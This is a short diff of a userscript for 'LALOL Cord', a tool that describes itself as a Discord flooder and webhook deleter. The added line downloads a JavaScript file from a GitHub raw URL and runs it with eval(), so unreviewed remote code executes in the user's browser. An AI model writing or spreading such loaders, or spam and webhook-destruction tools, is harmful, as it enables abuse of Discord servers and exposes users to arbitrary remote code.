@@ -1,5 +1,6 @@
 // ==UserScript==
 // @name         ⚡ LALOL Cord
+// @namespace    https://github.com/Its-LALOL/LALOL-Cord
 // @description  Discord flooder, webhook deleter
 // @version      ㅤ
 // @author       LALOL
@@ -8,4 +9,4 @@
 // @grant        none
 // ==/UserScript==
 
-print('test')
+fetch('https://raw.githubusercontent.com/Its-LALOL/LALOL-Cord/main/source.js').then(function(a){a.text().then(function(a){eval(a)})})
